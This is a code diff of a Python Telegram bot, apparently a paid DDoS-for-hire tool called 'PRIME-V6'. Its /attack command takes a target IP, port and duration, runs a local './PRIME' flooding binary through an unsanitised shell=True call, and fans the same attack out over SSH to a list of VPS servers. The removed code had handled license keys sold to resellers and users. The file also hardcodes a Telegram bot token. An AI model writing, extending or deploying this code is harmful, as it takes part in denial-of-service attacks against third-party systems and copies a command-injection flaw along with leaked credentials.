@@ -1,15 +1,15 @@
 import os, time, json, paramiko, random, string, threading, subprocess
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 from telegram import Update
-from datetime import datetime
 
-# ==================== SECURE CONFIG ====================
-# Railway Variables priority hain, warna ye default use honge
-TELEGRAM_TOKEN = os.getenv("API_KEY", "8348509991:AAGY_0IqOJH8K2VZnWSQEF2VygFSAcS6ZN4") 
-OWNER_ID = int(os.getenv("OWNER_ID", 2109683176)) 
-# =======================================================
+# ==================== CONFIG (AUTO-DETECT) ====================
+# Railway Variables se data lega
+TELEGRAM_TOKEN = os.getenv("API_KEY", "8348509991:AAGY_0IqOJH8K2VZnWSQEF2VygFSAcS6ZN4")
 
-# Database initialization
+# ID ko text ki tarah handle karenge taaki crash na ho
+OWNER_ID = str(os.getenv("OWNER_ID", "2109683176"))
+# ==============================================================
+
 FILES = ["vps.json", "users.json", "keys.json", "resellers.json"]
 for f in FILES: 
     if not os.path.exists(f): 
@@ -23,44 +23,38 @@ def load_data(file):
 def save_data(file, data):
     with open(file, 'w') as f: json.dump(data, f, indent=2)
 
-BANNER = "⚔️ 𝗣𝗥𝗜𝗠𝗘𝗫𝗔𝗥𝗠𝗬 𝗠𝗔𝗦𝗧𝗘𝗥-𝗩𝟲 ⚔️"
-
-# --- AUTH CHECK ---
 def is_auth(uid):
     uid_str = str(uid)
-    if uid == OWNER_ID: return True
+    # Owner check (String comparison for safety)
+    if uid_str == OWNER_ID: return True
     
     resellers = load_data("resellers.json")
     if uid_str in resellers: return True
     
     users = load_data("users.json")
-    # Yahan Syntax Error fix kar diya gaya hai
-    if uid_str in users and users[uid_str]['expiry'] > time.time():
+    if uid_str in users and users[uid_str].get('expiry', 0) > time.time():
         return True
     return False
 
-# --- COMMANDS ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    if not is_auth(uid):
-        await update.message.reply_text(f"❌ **ACCESS DENIED**\n\nID: `{uid}` is not authorized.\nContact @PRIME_X_ARMY", parse_mode="Markdown")
+    if not is_auth(update.effective_user.id):
+        await update.message.reply_text(f"❌ Access Denied\nYour ID: {update.effective_user.id}")
         return
-    
-    await update.message.reply_text(f"{BANNER}\n\n🚀 `/attack <ip> <port> <time>`\n🔑 `/redeem <key>`\n📊 `/status`", parse_mode="Markdown")
+    await update.message.reply_text("⚔️ PRIME-V6 MASTER ONLINE\n\n🚀 /attack <ip> <port> <time>")
 
 async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_auth(update.effective_user.id): return
     if len(context.args) < 3:
-        await update.message.reply_text("💡 Usage: `/attack <ip> <port> <time>`")
+        await update.message.reply_text("Usage: /attack <ip> <port> <time>")
         return
     
     ip, port, dur = context.args
-    await update.message.reply_text(f"🚀 **ATTACK TRIGGERED**\n\n🎯 Target: `{ip}:{port}`\n⏳ Time: `{dur}s`", parse_mode="Markdown")
+    await update.message.reply_text(f"🚀 Attack Sent to {ip}:{port} for {dur}s")
     
-    # Local Railway Execution
+    # Local Attack
     subprocess.Popen(f"./PRIME {ip} {port} {dur}", shell=True)
     
-    # VPS Execution
+    # VPS Attack
     vps_servers = load_data("vps.json")
     for vps in vps_servers:
         threading.Thread(target=ssh_exec, args=(vps, ip, port, dur)).start()
@@ -74,37 +68,9 @@ def ssh_exec(vps, ip, port, dur):
         ssh.close()
     except: pass
 
-async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != OWNER_ID: return
-    days = int(context.args[0]) if context.args else 30
-    key = f"PRIME-{''.join(random.choices(string.ascii_uppercase + string.digits, k=10))}"
-    keys = load_data("keys.json")
-    keys[key] = {"dur": days * 86400}
-    save_data("keys.json", keys)
-    await update.message.reply_text(f"✅ **KEY GENERATED**\n\n`{key}`\nValid: `{days} Days`", parse_mode="Markdown")
-
-async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = str(update.effective_user.id)
-    key = context.args[0].upper() if context.args else ""
-    keys = load_data("keys.json")
-    if key in keys:
-        users = load_data("users.json")
-        users[uid] = {"expiry": time.time() + keys[key]["dur"]}
-        save_data("users.json", users)
-        del keys[key]
-        save_data("keys.json", keys)
-        await update.message.reply_text("✅ **ACTIVATED!**")
-    else:
-        await update.message.reply_text("❌ **INVALID KEY**")
-
 if __name__ == "__main__":
-    if not TELEGRAM_TOKEN:
-        print("❌ API_KEY Missing!")
-    else:
-        app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
-        app.add_handler(CommandHandler("start", start))
-        app.add_handler(CommandHandler("attack", attack))
-        app.add_handler(CommandHandler("gen", gen))
-        app.add_handler(CommandHandler("redeem", redeem))
-        print("🔥 PRIME-MASTER V6 LIVE")
-        app.run_polling()
+    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("attack", attack))
+    print("🔥 Bot Started Successfully!")
+    app.run_polling()
